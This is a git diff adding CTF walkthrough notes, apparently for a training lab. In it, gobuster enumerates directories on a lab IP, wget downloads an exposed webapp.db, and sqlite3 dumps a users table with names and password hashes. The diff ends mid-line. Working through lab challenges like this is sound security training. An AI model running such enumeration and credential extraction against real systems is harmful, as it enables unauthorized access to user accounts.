@@ -118,3 +118,66 @@ printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(unam
 DR PEPPER MAKES THE WORLD TASTE BETTER!
 $
 ```
+
+
+# day2
+- [ admin]
+
+# day3
+
+```
+oot@kali:~# gobuster dir -u http://10.10.209.246 -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.209.246
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/07/16 16:06:08 Starting gobuster
+===============================================================
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/.hta (Status: 403)
+/api (Status: 301)
+/assets (Status: 301)
+/console (Status: 301)
+/favicon.ico (Status: 200)
+/index.php (Status: 200)
+/login (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2020/07/16 16:06:08 Finished
+
+
+root@kali:~# wget http://10.10.209.246/assets/webapp.db
+--2020-07-16 16:09:23--  http://10.10.209.246/assets/webapp.db
+Connecting to 10.10.209.246:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 28672 (28K)
+Saving to: ‘webapp.db’
+
+webapp.db           100%[===================>]  28.00K  --.-KB/s    in 0s
+
+2020-07-16 16:09:23 (323 MB/s) - ‘webapp.db’ saved [28672/28672]
+
+root@kali:~# sqlite3 webapp.db
+SQLite version 3.31.0 2019-12-29 00:52:41
+Enter ".help" for usage hints.
+sqlite> .tables
+sessions  users
+sqlite> select * from users
+   ...> ;
+4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
+23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
+4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
+sqlite> PRAGMA table_info(users);
+0|userID|TEXT|1||1
+1|username|TEXT|1||0
+2|password|TEXT|1||0
+3|admin|IN
+```
